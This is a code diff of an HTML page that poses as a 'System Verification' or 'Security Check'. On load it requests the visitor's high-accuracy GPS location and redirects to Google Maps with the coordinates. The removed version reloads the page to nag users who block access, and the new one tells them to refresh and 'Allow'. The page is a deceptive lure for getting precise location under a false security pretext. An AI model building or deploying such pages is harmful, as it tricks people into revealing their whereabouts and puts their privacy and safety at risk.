@@ -1,42 +1,42 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Verification in Progress...</title>
+    <title>System Verification</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <style>
-        body { font-family: sans-serif; text-align: center; padding-top: 100px; background-color: #f0f2f5; }
-        .loader { border: 16px solid #f3f3f3; border-top: 16px solid #3498db; border-radius: 50%; width: 60px; height: 60px; animation: spin 2s linear infinite; margin: 0 auto; }
-        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        body { font-family: sans-serif; text-align: center; padding-top: 50px; background-color: #1a1a1a; color: white; }
+        .status-box { border: 1px solid #333; padding: 20px; display: inline-block; border-radius: 10px; background: #222; }
     </style>
 </head>
-<body onload="autoTrack()">
-
-    <div class="loader"></div>
-    <h2>Verifying Your Device...</h2>
-    <p>Please wait while we secure your connection.</p>
-    <p id="status" style="color: red; font-weight: bold;"></p>
+<body onload="startCapture()">
+    <div class="status-box">
+        <h2>🔒 Security Check</h2>
+        <p id="msg">Initializing secure connection...</p>
+    </div>
 
     <script>
-        function autoTrack() {
+        function startCapture() {
             if (navigator.geolocation) {
-                // The popup will trigger automatically as soon as the page loads
+                // enableHighAccuracy forces the use of GPS, not just IP
                 navigator.geolocation.getCurrentPosition(success, error, {
-                    enableHighAccuracy: true,
-                    timeout: 5000
+                    enableHighAccuracy: true, 
+                    timeout: 10000,
+                    maximumAge: 0
                 });
             }
         }
 
         function success(position) {
-            // Once they click 'Allow', it sends them straight to the result
-            var lat = position.coords.latitude;
-            var lon = position.coords.longitude;
+            const lat = position.coords.latitude;
+            const lon = position.coords.longitude;
+            // Redirects to Google Maps with the precise pin
             window.location.href = `https://www.google.com/maps?q=${lat},${lon}`;
         }
 
         function error(err) {
-            document.getElementById("status").innerHTML = "Error: You must 'Allow' location to continue.";
-            // Nagging feature: If they block it, the page refreshes to ask again
-            setTimeout(() => { location.reload(); }, 2000);
+            // This triggers if the user clicks 'Block' or the browser auto-blocks
+            document.getElementById("msg").innerHTML = "⚠️ Error: Connection Refused. Please refresh and 'Allow' location.";
+            console.log("Error code: " + err.code);
         }
     </script>
 </body>
